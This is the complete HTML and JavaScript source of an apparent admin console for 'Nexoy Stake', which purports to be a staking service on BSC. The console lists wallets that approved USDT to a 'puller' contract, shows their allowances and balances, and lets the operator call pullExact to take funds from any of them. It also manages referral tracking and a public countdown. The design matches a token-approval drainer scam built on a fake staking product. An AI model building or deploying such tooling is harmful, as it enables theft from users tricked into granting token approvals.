<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Nexoy Stake – Admin Console</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:#050912;
      --bg-gradient: radial-gradient(120% 130% at 50% 0%, rgba(34,197,235,0.22) 0%, rgba(4,10,22,0.94) 60%, rgba(3,7,14,1) 100%);
      --surface:#0b1326;
      --surface-soft:rgba(11,22,38,0.7);
      --border:rgba(255,255,255,0.08);
      --text:#e9f2ff;
      --muted:#9fb5d2;
      --accent:#10b981;
      --accent-strong:#22d3ee;
      --danger:#f87171;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:'Space Grotesk','Inter',system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
      color:var(--text);
      background:var(--bg);
      min-height:100vh;
      position:relative;
    }
    body::before{
      content:"";
      position:fixed;
      inset:0;
      background:var(--bg-gradient);
      z-index:-2;
    }
    body::after{
      content:"";
      position:fixed;
      inset:0;
      background:linear-gradient(140deg, rgba(2,6,18,0.78), rgba(10,25,39,0.48));
      z-index:-1;
      pointer-events:none;
    }
    a{color:inherit;text-decoration:none}
    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Courier New",monospace;}
    .topbar{
      display:flex;
      justify-content:space-between;
      align-items:center;
      padding:18px clamp(16px,5vw,64px);
      position:sticky;
      top:0;
      z-index:10;
      backdrop-filter:blur(18px);
      background:rgba(6,14,28,0.72);
      border-bottom:1px solid var(--border);
    }
    .brand{
      display:flex;
      align-items:center;
      gap:14px;
      font-weight:700;
      letter-spacing:0.1em;
      text-transform:uppercase;
    }
    .brand span.logo{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      width:40px;
      height:40px;
      border-radius:14px;
      background:linear-gradient(135deg,var(--accent-strong),var(--accent));
      color:#03120f;
      font-weight:800;
      font-size:1.05rem;
    }
    .brand small{
      display:block;
      font-size:0.72rem;
      letter-spacing:0.18em;
      color:var(--muted);
    }
    .controls{
      display:flex;
      flex-wrap:wrap;
      gap:12px;
      align-items:center;
    }
    .chip{
      display:inline-flex;
      align-items:center;
      gap:8px;
      padding:8px 12px;
      border-radius:999px;
      border:1px solid rgba(16,185,129,0.28);
      background:rgba(10,20,36,0.6);
      font-size:0.82rem;
      color:var(--muted);
    }
    .chip .mono{color:var(--text)}
    .badge{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      padding:6px 14px;
      border-radius:999px;
      font-size:0.8rem;
      letter-spacing:0.08em;
      text-transform:uppercase;
      border:1px solid rgba(255,255,255,0.18);
      background:rgba(15,22,46,0.7);
    }
    .badge.success{color:var(--accent);border-color:rgba(16,185,129,0.45);background:rgba(16,185,129,0.18);}
    .badge.warn{color:#ffe69c;border-color:rgba(255,224,138,0.4);background:rgba(255,224,138,0.14);}
    .badge.neutral{color:var(--muted);}
    button{
      appearance:none;
      border:none;
      cursor:pointer;
      font-weight:600;
      border-radius:14px;
      padding:12px 18px;
      transition:transform .2s ease, box-shadow .2s ease, opacity .2s;
    }
    button.primary{
      background:linear-gradient(135deg,var(--accent-strong),var(--accent));
      color:#02150f;
    }
    button.primary:hover{transform:translateY(-2px);box-shadow:0 18px 40px rgba(16,185,129,0.32);}
    button.ghost{
      background:transparent;
      color:var(--text);
      border:1px solid rgba(255,255,255,0.18);
    }
    main{
      padding: clamp(28px, 5vw, 64px);
      display:flex;
      flex-direction:column;
      gap:28px;
      max-width:1200px;
      margin:0 auto;
      width:min(1200px, 100%);
    }
    .panel{
      background:rgba(12,18,40,0.78);
      border:1px solid var(--border);
      border-radius:28px;
      padding:32px clamp(20px,4vw,40px);
      box-shadow:0 40px 80px rgba(0,0,0,0.45);
    }
    .panel-header{
      display:flex;
      justify-content:space-between;
      gap:24px;
      flex-wrap:wrap;
      align-items:flex-start;
    }
    .panel-header h1{
      margin:0;
      font-size:1.8rem;
      letter-spacing:0.04em;
    }
    .panel-header p{
      margin:6px 0 0;
      color:var(--muted);
      font-size:0.95rem;
      max-width:420px;
      line-height:1.6;
    }
    .meta-grid{
      display:grid;
      gap:8px;
      font-size:0.86rem;
      color:var(--muted);
    }
    .meta-grid span.title{
      color:var(--text);
      font-weight:600;
    }
    .stats-row{
      margin:28px 0 18px;
      display:grid;
      grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
      gap:18px;
    }
    .countdown-editor{
      margin-top:12px;
      border:1px solid rgba(255,255,255,0.12);
      border-radius:20px;
      padding:18px 22px;
      background:rgba(7,12,28,0.78);
      display:flex;
      flex-direction:column;
      gap:10px;
    }
    .countdown-editor__row{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:16px;
      flex-wrap:wrap;
    }
    .countdown-editor label{
      font-size:0.75rem;
      letter-spacing:0.16em;
      text-transform:uppercase;
      color:var(--muted);
    }
    .countdown-editor small{
      color:var(--muted);
      font-size:0.8rem;
    }
    .countdown-editor__controls{
      display:flex;
      flex-wrap:wrap;
      gap:12px;
      align-items:center;
    }
    .countdown-editor input{
      flex:1;
      min-width:220px;
      padding:10px 14px;
      border-radius:12px;
      border:1px solid rgba(255,255,255,0.18);
      background:rgba(9,14,28,0.8);
      color:var(--text);
      font-size:0.9rem;
    }
    .stat-card{
      background:rgba(20,28,58,0.75);
      border:1px solid rgba(255,255,255,0.12);
      border-radius:20px;
      padding:18px 20px;
      display:flex;
      flex-direction:column;
      gap:6px;
    }
    .stat-card span.label{
      text-transform:uppercase;
      letter-spacing:0.12em;
      font-size:0.7rem;
      color:var(--muted);
    }
    .stat-card strong{
      font-size:1.7rem;
      font-weight:700;
      color:var(--accent-strong);
    }
    .stat-card small{
      color:var(--muted);
      font-size:0.78rem;
    }
    .table-wrapper{
      margin-top:16px;
      border:1px solid rgba(255,255,255,0.08);
      border-radius:20px;
      background:rgba(13,19,40,0.6);
      position:relative;
      box-shadow:0 30px 60px rgba(2,6,18,0.45);
    }
    .table-scroll{
      overflow-x:auto;
      -webkit-overflow-scrolling:touch;
    }
    .table-scroll::-webkit-scrollbar{
      height:6px;
    }
    .table-scroll::-webkit-scrollbar-thumb{
      background:rgba(16,185,129,0.4);
      border-radius:99px;
    }
    table{
      width:100%;
      border-collapse:collapse;
      min-width:900px;
    }
    thead{
      background:rgba(20,28,58,0.88);
    }
    th{
      text-align:left;
      padding:14px 18px;
      font-size:0.78rem;
      letter-spacing:0.12em;
      text-transform:uppercase;
      color:var(--muted);
      border-bottom:1px solid rgba(255,255,255,0.08);
    }
    tbody tr{
      border-bottom:1px solid rgba(255,255,255,0.05);
    }
    tbody tr:last-child{border-bottom:none;}
    td{
      padding:16px 18px;
      font-size:0.92rem;
      vertical-align:top;
    }
    td .tx-link a{
      color:var(--accent-strong);
      font-size:0.78rem;
      text-transform:uppercase;
      letter-spacing:0.1em;
    }
    td .tx-link a:hover{text-decoration:underline;}
    .muted{color:var(--muted);}
    .code-chip{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      padding:4px 10px;
      border-radius:999px;
      border:1px solid rgba(16,185,129,0.45);
      background:rgba(16,185,129,0.16);
      font-size:0.75rem;
      letter-spacing:0.1em;
      color:var(--accent-strong);
      text-transform:uppercase;
    }
    .ref-meta{
      display:flex;
      flex-direction:column;
      gap:6px;
    }
    .ref-meta .stack{
      display:flex;
      gap:8px;
      align-items:center;
      flex-wrap:wrap;
    }
    input.amount{
      width:120px;
      padding:9px 10px;
      border-radius:12px;
      border:1px solid rgba(255,255,255,0.18);
      background:rgba(9,14,28,0.75);
      color:var(--text);
      font-weight:600;
    }
    input.amount:disabled{
      opacity:0.6;
      cursor:not-allowed;
    }
    button.pull{
      background:linear-gradient(135deg,var(--accent-strong),var(--accent));
      color:#03120f;
      padding:10px 16px;
      border-radius:12px;
    }
    button.pull.disabled,
    button.pull:disabled{
      opacity:0.45;
      cursor:not-allowed;
      box-shadow:none;
      transform:none;
    }
    .empty-state{
      padding:32px;
      text-align:center;
      color:var(--muted);
      font-size:0.95rem;
      display:none;
    }
    .log-panel{
      background:rgba(12,18,40,0.72);
      border:1px solid var(--border);
      border-radius:24px;
      padding:24px 28px;
      box-shadow:0 28px 60px rgba(0,0,0,0.4);
    }
    .log-panel h2{
      margin:0 0 12px;
      font-size:1.2rem;
      letter-spacing:0.08em;
    }
    #log{
      margin:0;
      max-height:260px;
      overflow:auto;
      padding:18px;
      border-radius:16px;
      background:rgba(6,10,26,0.8);
      border:1px solid rgba(255,255,255,0.08);
      font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Courier New",monospace;
      font-size:0.82rem;
      color:#b6c8ff;
      white-space:pre-wrap;
    }
    @media (max-width:980px){
      table{min-width:680px;}
      .controls{justify-content:flex-end;}
      .panel{
        padding:24px clamp(16px, 4vw, 30px);
      }
      .stats-row{
        gap:12px;
      }
      th, td{
        padding:12px 14px;
      }
      .table-wrapper{
        border-radius:18px;
      }
    }
    @media (max-width:720px){
      .topbar{flex-direction:column;align-items:flex-start;gap:16px;}
      button.primary, button.ghost{width:100%;}
      .controls{width:100%;justify-content:stretch;}
      .controls button{flex:1;}
    }
    @media (max-width:640px){
      main{padding:20px 14px;}
      .panel{padding:22px 18px;}
      .table-wrapper{margin-top:12px;}
      .table-scroll{padding:0 6px;}
      th,td{
        font-size:0.78rem;
      }
      .empty-state{
        padding:24px;
      }
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.12.1/dist/ethers.umd.min.js"></script>
  <script src="js/config.js"></script>
  <script src="js/abi.js"></script>
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="logo">NX</span>
      <div>
        <div>Nexoy Stake</div>
        <small>Control Hub</small>
      </div>
    </div>
    <div class="controls">
      <div class="chip">Puller <span class="mono" id="pullerAddr"></span></div>
      <div class="chip">USDT <span class="mono" id="assetAddr"></span></div>
      <span id="status" class="badge neutral">Disconnected</span>
      <button id="btnSwitch" class="ghost">Switch to BSC</button>
      <button id="btnConnect" class="primary">Connect Admin Wallet</button>
    </div>
  </header>

  <main>
    <section class="panel">
      <div class="panel-header">
        <div>
          <h1>Authorizations</h1>
          <p>Monitor wallets that approved Nexoy Stake, follow referral lineage, and execute precise pulls when the operator is ready.</p>
        </div>
        <div class="meta-grid">
          <span>Operator (contract): <span class="mono" id="operator">—</span></span>
          <span>You: <span class="mono" id="you">—</span></span>
        </div>
      </div>

      <div class="stats-row">
        <div class="stat-card">
          <span class="label">Ready wallets</span>
          <strong id="adminTotal">0</strong>
          <small>Active approvals stored on the server</small>
        </div>
        <div class="stat-card">
          <span class="label">Referred users</span>
          <strong id="adminReferred">0</strong>
          <small>Wallets attributed to referral codes</small>
        </div>
      </div>

      <div class="countdown-editor">
        <div class="countdown-editor__row">
          <label for="countdownTarget">Countdown target</label>
          <small id="countdownHint">Loading current target…</small>
        </div>
        <div class="countdown-editor__controls">
          <input type="datetime-local" id="countdownTarget" />
          <button class="primary" id="btnUpdateCountdown">Update target</button>
          <button class="ghost" id="btnResetCountdown">Reset</button>
        </div>
        <div class="countdown-editor__controls">
          <input type="number" min="1" id="countdownDays" placeholder="Days from now" />
          <button class="primary" id="btnSetCountdownDays">Set days</button>
        </div>
      </div>

      <div class="table-wrapper">
        <div class="table-scroll">
          <table id="usersTbl">
            <thead>
              <tr>
                <th>#</th>
                <th>Date</th>
                <th>Address</th>
                <th>Invite Tag</th>
                <th>Referred By</th>
                <th>Allowance</th>
                <th>Balance</th>
                <th>Amount to pull</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody></tbody>
          </table>
        </div>
        <div class="empty-state" id="emptyState">No Nexoy Stake approvals yet.</div>
      </div>
    </section>

    <section class="log-panel">
      <h2>Event Stream</h2>
      <pre id="log"></pre>
    </section>
  </main>

<script>
(async () => {
  const { PULLER_ADDRESS, USDT_ADDRESS, DEFAULT_APPROVAL_USDT, BSC, BACKEND_URL } = window.APP_CONFIG;
  const BACKEND = BACKEND_URL || window.location.origin;
  const el = (id) => document.getElementById(id);

  const tableBody = document.querySelector('#usersTbl tbody');
  const emptyState = el('emptyState');
  const statusBadge = el('status');
  const operatorEl = el('operator');
  const youEl = el('you');
  const adminTotalEl = el('adminTotal');
  const adminReferredEl = el('adminReferred');
  const logEl = el('log');
  const btnConnect = el('btnConnect');
  const btnSwitch = el('btnSwitch');
  const countdownInput = el('countdownTarget');
  const btnUpdateCountdown = el('btnUpdateCountdown');
  const btnResetCountdown = el('btnResetCountdown');
  const daysInput = el('countdownDays');
  const btnSetCountdownDays = el('btnSetCountdownDays');
  const countdownHint = el('countdownHint');

  el('pullerAddr').textContent = PULLER_ADDRESS;
  el('assetAddr').textContent  = USDT_ADDRESS;

  const log = (message) => {
    logEl.textContent += `\n${new Date().toLocaleTimeString()}  ${message}`;
    logEl.scrollTop = logEl.scrollHeight;
  };

  const setStatus = (text, variant = 'neutral') => {
    statusBadge.textContent = text;
    statusBadge.className = `badge ${variant}`;
  };

  const MS_MINUTE = 60 * 1000;
  const toDatetimeLocalValue = (value) => {
    if (!value) return '';
    const date = new Date(value);
    if (!Number.isFinite(date)) return '';
    const offset = date.getTimezoneOffset();
    const local = new Date(date.getTime() - offset * MS_MINUTE);
    return local.toISOString().slice(0, 16);
  };
  const formatLocalLabel = (value) => {
    return Number.isFinite(value) ? new Date(value).toLocaleString() : '—';
  };

  const sendCountdownUpdate = async (payload) => {
    const res = await fetch(`${BACKEND}/api/countdown`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) {
      const errBody = await res.json().catch(() => ({}));
      throw new Error(errBody?.error || `status ${res.status}`);
    }
    return res.json();
  };

  const loadCountdownTarget = async () => {
    if (!countdownHint && !countdownInput) return;
    try {
      const res = await fetch(`${BACKEND}/api/countdown`, { cache: 'no-store' });
      if (!res.ok) throw new Error(`status ${res.status}`);
      const payload = await res.json();
      const parsedTarget = Number.isFinite(Number(payload?.target))
        ? Number(payload.target)
        : Number.isFinite(Date.parse(payload?.endDate))
          ? Date.parse(payload.endDate)
          : null;
      if (countdownInput) {
        countdownInput.value = toDatetimeLocalValue(parsedTarget);
      }
      if (countdownHint) {
        const label = formatLocalLabel(parsedTarget);
        countdownHint.textContent = parsedTarget ? `Current target: ${label}` : 'No countdown target set';
      }
    } catch (error) {
      if (countdownHint) countdownHint.textContent = 'Unable to load countdown target.';
      log('countdown load error: ' + (error?.message || error));
    }
  };

  const shorten = (addr) => addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : '';
  const dateFmt = new Intl.DateTimeFormat(undefined, { dateStyle: 'medium', timeStyle: 'short' });

  let provider, signer, puller, usdt;
  let decimals = 18;
  let you = null;
  let isOperator = false;

  const formatToken = (bn) => {
    if (bn === null || typeof bn === 'undefined') return '—';
    try {
      const formatted = ethers.formatUnits(bn, decimals);
      const numeric = Number(formatted);
      if (Number.isFinite(numeric)) {
        return numeric.toLocaleString(undefined, { maximumFractionDigits: 6 });
      }
      return formatted;
    } catch {
      return bn?.toString?.() || '—';
    }
  };

  async function ensureBSC() {
    const current = await window.ethereum.request({ method: 'eth_chainId' });
    if (current !== BSC.CHAIN_ID_HEX) {
      try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC.CHAIN_ID_HEX }] });
      } catch (err) {
        if (err.code === 4902) {
          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [BSC.CHAIN_PARAMS] });
        } else {
          throw err;
        }
      }
    }
  }

  async function fetchUsers() {
    try {
      const res = await fetch(`${BACKEND}/api/users`, { cache: 'no-store' });
      if (!res.ok) throw new Error(`status ${res.status}`);
      const data = await res.json();
      return Array.isArray(data) ? data : [];
    } catch (error) {
      log('load error: ' + (error?.message || error));
      return [];
    }
  }

  function updateStats(approvals) {
    const uniqueAddresses = new Set(approvals.map(u => (u.address || '').toLowerCase()).filter(Boolean));
    adminTotalEl.textContent = uniqueAddresses.size.toLocaleString();
    const referred = approvals.filter(u => !!u.referrer).length;
    adminReferredEl.textContent = referred.toLocaleString();
  }

  function renderUsers(approvals, chainDataReady) {
    tableBody.innerHTML = '';
    if (!approvals.length) {
      emptyState.style.display = 'flex';
      return;
    }
    emptyState.style.display = 'none';

    approvals.forEach((entry, idx) => {
      const created = entry.createdAt || entry.updatedAt;
      const createdLabel = created ? dateFmt.format(new Date(created)) : '—';
      const txLink = entry.txHash ? `<a href="https://bscscan.com/tx/${entry.txHash}" target="_blank" rel="noopener">view tx</a>` : '';
      const refCode = entry.refCode || '—';
      const refByHtml = entry.referrer
        ? `<div class="ref-meta"><div class="stack"><span class="mono">${shorten(entry.referrer)}</span>${entry.referrerCode ? `<span class="code-chip">${entry.referrerCode}</span>` : ''}</div></div>`
        : '<span class="muted">Direct</span>';
      const allowanceText = chainDataReady && entry.allowance != null ? formatToken(entry.allowance) : '<span class="muted">—</span>';
      const balanceText = chainDataReady && entry.balance != null ? formatToken(entry.balance) : '<span class="muted">—</span>';

      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${idx + 1}</td>
        <td>
          <div>${createdLabel}</div>
          ${txLink ? `<div class="tx-link">${txLink}</div>` : ''}
        </td>
        <td class="mono">${entry.address}</td>
        <td><span class="code-chip">${refCode}</span></td>
        <td>${refByHtml}</td>
        <td class="mono">${allowanceText}</td>
        <td class="mono">${balanceText}</td>
        <td>
          <input class="amount" type="number" value="${DEFAULT_APPROVAL_USDT}" step="0.000001" ${chainDataReady ? '' : 'disabled'} />
        </td>
        <td><button class="pull"${!chainDataReady || !isOperator ? ' disabled' : ''}>Pull</button></td>
      `;

      const amountInput = tr.querySelector('input.amount');
      const pullBtn = tr.querySelector('button.pull');

      if (!chainDataReady) {
        pullBtn.title = 'Connect the operator wallet to pull funds.';
        pullBtn.classList.add('disabled');
      } else if (!isOperator) {
        pullBtn.title = 'Only the contract operator can pull.';
        pullBtn.classList.add('disabled');
      } else {
        pullBtn.addEventListener('click', async () => {
          try {
            const amountStr = amountInput.value;
            if (!amountStr || Number(amountStr) <= 0) {
              alert('Amount must be greater than 0');
              return;
            }
            const amt = ethers.parseUnits(String(amountStr), decimals);
            const tx = await puller.pullExact(entry.address, amt);
            log(`pullExact(${shorten(entry.address)}, ${amountStr}) tx: ${tx.hash}`);
            await tx.wait();
            log('pull confirmed');
            await loadUsers(true);
          } catch (error) {
            log('pull error: ' + (error?.message || error));
          }
        });
      }

      tableBody.appendChild(tr);
    });
  }

  async function loadUsers(withChainData) {
    const approvals = await fetchUsers();
    updateStats(approvals);
    const items = approvals.map(entry => ({ ...entry }));
    if (withChainData && puller && usdt) {
      await Promise.all(items.map(async (user) => {
        try {
          user.allowance = await usdt.allowance(user.address, PULLER_ADDRESS);
          user.balance = await usdt.balanceOf(user.address);
        } catch (error) {
          user.allowance = null;
          user.balance = null;
          log('read error: ' + (error?.message || error));
        }
      }));
    } else {
      items.forEach(user => {
        user.allowance = null;
        user.balance = null;
      });
    }
    items.sort((a, b) => (b.createdAt || b.updatedAt || 0) - (a.createdAt || a.updatedAt || 0));
    renderUsers(items, withChainData && puller && usdt);
  }

  async function connectAdmin() {
    if (!window.ethereum) {
      alert('No wallet detected. Please install MetaMask.');
      return;
    }
    try {
      await ensureBSC();
      provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send('eth_requestAccounts', []);
      signer = await provider.getSigner();
      you = await signer.getAddress();
      youEl.textContent = you;
      setStatus('Connected', 'success');

      puller = new ethers.Contract(PULLER_ADDRESS, window.ABI.puller, signer);
      usdt = new ethers.Contract(USDT_ADDRESS, window.ABI.erc20, signer);
      try { decimals = await usdt.decimals(); } catch {}
      try {
        const operator = await puller.operator();
        operatorEl.textContent = operator;
        isOperator = operator.toLowerCase() === you.toLowerCase();
        if (!isOperator) {
          setStatus('Wrong wallet', 'warn');
          log('Warning: connected wallet is not the operator; pull actions will fail.');
        }
      } catch (error) {
        log('operator read error: ' + (error?.message || error));
      }
      await loadUsers(true);
    } catch (error) {
      log('connect error: ' + (error?.message || error));
    }
  }

  btnConnect.addEventListener('click', connectAdmin);
  btnSwitch.addEventListener('click', () => {
    if (!window.ethereum) return alert('No wallet detected.');
    ensureBSC().catch(err => log('switch error: ' + (err?.message || err)));
  });

  if (btnUpdateCountdown) {
    btnUpdateCountdown.addEventListener('click', async () => {
      if (!countdownInput?.value) {
        alert('Choose a valid target date and time.');
        return;
      }
      btnUpdateCountdown.disabled = true;
      try {
        const iso = new Date(countdownInput.value).toISOString();
        const data = await sendCountdownUpdate({ target: iso });
        if (countdownHint) countdownHint.textContent = `Current target: ${formatLocalLabel(Number(data.target))}`;
        log(`countdown target updated → ${iso}`);
      } catch (error) {
        alert('Unable to update countdown: ' + (error?.message || ''));
      } finally {
        btnUpdateCountdown.disabled = false;
        await loadCountdownTarget();
      }
    });
  }

  if (btnResetCountdown) {
    btnResetCountdown.addEventListener('click', async () => {
      if (!confirm('Reset countdown target to the default fallback?')) return;
      btnResetCountdown.disabled = true;
      try {
        await sendCountdownUpdate({ clear: true });
        log('countdown target reset to default');
        if (countdownHint) countdownHint.textContent = 'Countdown target reset to default.';
      } catch (error) {
        alert('Unable to reset countdown: ' + (error?.message || ''));
      } finally {
        btnResetCountdown.disabled = false;
        await loadCountdownTarget();
      }
    });
  }

  if (btnSetCountdownDays) {
    btnSetCountdownDays.addEventListener('click', async () => {
      const days = Number(daysInput?.value);
      if (!Number.isFinite(days) || days <= 0) {
        alert('Enter a number of days greater than zero.');
        return;
      }
      btnSetCountdownDays.disabled = true;
      try {
        const data = await sendCountdownUpdate({ daysFromNow: days });
        if (countdownHint) countdownHint.textContent = `Current target: ${formatLocalLabel(Number(data.target))}`;
        log(`countdown target set to ${days} days from now`);
      } catch (error) {
        alert('Unable to set countdown: ' + (error?.message || ''));
      } finally {
        btnSetCountdownDays.disabled = false;
        await loadCountdownTarget();
      }
    });
  }

  if (window.ethereum?.on) {
    window.ethereum.on('chainChanged', () => window.location.reload());
    window.ethereum.on('accountsChanged', () => window.location.reload());
  }

  await loadUsers(false);
  await loadCountdownTarget();
})();
</script>
</body>
</html>
